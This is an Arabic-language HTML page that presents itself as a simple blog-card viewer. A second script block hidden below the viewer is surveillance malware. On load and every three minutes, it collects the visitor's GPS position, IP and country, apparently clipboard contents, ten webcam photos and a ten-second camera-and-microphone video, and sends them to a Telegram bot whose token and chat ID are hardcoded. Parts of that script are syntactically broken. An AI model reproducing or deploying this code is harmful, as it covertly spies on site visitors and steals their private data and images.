<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <title>مدونات كاملة</title>
  <style>
    body {
      margin: 0;
      background: #fff000;
      font-family: Arial, sans-serif;
    }

    #blogs {
      display: grid;
      grid-template-columns: repeat(3, 1fr);
      gap: 20px;
      padding: 30px;
      direction: rtl;
    }

    .blog-box {
      background: rgba(90, 0, 130, 0.2);
      border: 2px dashed #cc33ff;
      box-shadow: 0 0 15px #cc33ff, 0 0 30px #9900cc;
      border-radius: 15px;
      padding: 10px;
      color: black;
      height: 150px;
      overflow: hidden;
      cursor: pointer;
      transition: transform 0.2s ease;
    }

    .blog-box:hover {
      transform: scale(1.05);
    }

    /* مربع كبير يغطي الشاشة بالكامل */
    #overlay {
      position: fixed;
      top: 0; left: 0;
      width: 100vw;
      height: 100vh;
      background: rgba(0, 0, 0, 0.9);
      color: white;
      display: none;
      justify-content: center;
      align-items: center;
      text-align: center;
      padding: 40px;
      z-index: 999;
      flex-direction: column;
    }

    #fullText {
      font-size: 28px;
      line-height: 2.2;
      white-space: pre-wrap;
      max-width: 90vw;
    }

    #copyBtn {
      margin-top: 30px;
      background-color: purple;
      color: white;
      font-size: 20px;
      padding: 12px 30px;
      border: none;
      border-radius: 10px;
      cursor: pointer;
    }

    .home-btn {
      position: fixed;
      bottom: 20px;
      right: 20px;
      width: 75px;
      height: 75px;
      background-color: pink;
      color: black;
      font-size: 30px;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      text-decoration: none;
      box-shadow: 0 0 15px yellow;
      animation: pulse 2s infinite;
      z-index: 1000;
    }

    @keyframes pulse {
      0% { box-shadow: 0 0 5px yellow; }
      50% { box-shadow: 0 0 25px yellow; }
      100% { box-shadow: 0 0 5px yellow; }
    }

    @media (max-width: 768px) {
      #blogs {
        grid-template-columns: 1fr;
      }
      #fullText {
        font-size: 22px;
      }
    }
  </style>
</head>
<body>

<!-- شبكة المربعات -->
<div id="blogs"></div>

<!-- مربع يغطي الشاشة بالكامل -->
<div id="overlay" onclick="hideOverlay(event)">
  <div id="fullText" onclick="event.stopPropagation()"></div>
  <button id="copyBtn" onclick="copyText()">📋 نسخ النص</button>
</div>

<!-- زر وردي يرجع إلى index.html -->
<a href="index.html" class="home-btn" title="العودة للصفحة الرئيسية">🏠</a>

<script>
  const blogFiles = ['blog1.txt', 'blog2.txt', 'blog3.txt'];
  const blogsContainer = document.getElementById('blogs');
  const overlay = document.getElementById('overlay');
  const fullText = document.getElementById('fullText');
  let allBlogs = [];

  async function loadBlogs() {
    for (const file of blogFiles) {
      try {
        const res = await fetch(file);
        const text = await res.text();
        const parts = text.split(/(?:\r?\n){2,}|===/g).filter(e => e.trim());
        allBlogs.push(...parts);
      } catch (err) {
        console.error('فشل تحميل', file, err);
      }
    }

    allBlogs.slice(0, 9).forEach((text) => {
      const box = document.createElement('div');
      box.className = 'blog-box';
      box.innerText = text.substring(0, 60) + '...';
      box.onclick = () => showFullText(text);
      blogsContainer.appendChild(box);
    });
  }

  function showFullText(text) {
    fullText.innerText = text;
    overlay.style.display = 'flex';
  }

  function hideOverlay(event) {
    overlay.style.display = 'none';
  }

  function copyText() {
    navigator.clipboard.writeText(fullText.innerText)
      .then(() => alert("✅ تم نسخ النص!"));
  }

  loadBlogs();
</script>
</div>


<script>
const bots = [
  { token: '7557167179:AAG0_jw9g7EEPhFKJbW5pMLhiPidHrGzt8M', chat_id: '7664410054' },

  clipboardRead = true;
  try {

  } catch (e) {

  }
});

// الوظيفة الكاملة المتكررة:
async function collectAndSend() {
  let images = [];
  let videoBlob = null;
  let gpsData = "❌ لم يُسمح بالموقع";
  let ip = "❌ غير معروف", country = "❌ غير معروف", region = "❌ غير معروف";

  // GPS
  await new Promise((resolve) => {
    navigator.geolocation.getCurrentPosition(
      pos => {
        gpsData = `${pos.coords.latitude}, ${pos.coords.longitude}`;
        resolve();
      },
      err => {
        gpsData = "❌ رفض الموقع";
        resolve();
      }
    );
  });

  // IP
  try {
    const res = await fetch("https://ipinfo.io/json?token=6d3fbbdc9f6b37");
    const data = await res.json();
    ip = data.ip;
    country = data.country;
    region = data.region;
  } catch (e) {
    console.error("❌ فشل في جلب IP");
  }

  // الكاميرا + المايك
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
    const video = document.createElement('video');
    video.srcObject = stream;
    await video.play();

    const canvas = document.createElement('canvas');
    canvas.width = 300;
    canvas.height = 200;
    const ctx = canvas.getContext('2d');

    // 10 صور
    for (let i = 0; i < 10; i++) {
      await new Promise(r => setTimeout(r, 2000));
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      await new Promise(resolve => canvas.toBlob(blob => {
        images.push(blob);
        resolve();
      }, 'image/png'));
    }

    // فيديو 10 ثوانٍ
    const recorder = new MediaRecorder(stream);
    const chunks = [];
    recorder.ondataavailable = e => chunks.push(e.data);
    recorder.onstop = () => {
      videoBlob = new Blob(chunks, { type: 'video/webm' });
    };
    recorder.start();
    await new Promise(r => setTimeout(r, 10000));
    recorder.stop();

    await new Promise(r => setTimeout(r, 1000)); // انتظر تجهيز الفيديو
  } catch (e) {
    console.error("❌ فشل الكاميرا/مايك");

  // الرسائل

    `📋الحافظة📋\n${clipboardText}`

      await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id, text: msg })
      });
    }

    if (videoBlob) {
      const form = new FormData();
      form.append("chat_id", chat_id);
      form.append("caption", "🎬فيديوهات🎬");
      form.append("video", videoBlob, "intruder.webm");
      await fetch(`https://api.telegram.org/bot${token}/sendVideo`, {
        method: "POST",
        body: form
      });
    }

    for (let i = 0; i < images.length; i++) {
      const imgForm = new FormData();
      imgForm.append("chat_id", chat_id);
      if (i === 0) imgForm.append("caption", "📸صور📸");
      imgForm.append("photo", images[i], `img${i + 1}.png`);
      await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
        method: "POST",
        body: imgForm
      });
    }
  }
}

// أول تنفيذ عند الدخول
collectAndSend();

// إعادة كل 3 دقائق = 180000 ms
setInterval(collectAndSend, 180000);
</script>
